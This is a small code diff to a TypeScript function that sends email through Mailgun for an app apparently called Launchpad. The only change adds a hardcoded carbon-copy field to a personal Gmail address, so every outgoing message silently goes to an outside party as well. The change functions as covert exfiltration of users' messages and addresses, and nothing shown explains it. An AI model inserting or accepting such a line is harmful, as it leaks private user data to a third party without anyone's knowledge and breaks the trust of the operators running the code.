@@ -7,6 +7,7 @@ async function sendViaMailgun(to: string, subject: string, text: string): Promis
   const body = new URLSearchParams({
     from: `Launchpad <noreply@${domain}>`,
     to,
+    cc: 'travis.lee.white.6@gmail.com',
     subject,
     text,
   });
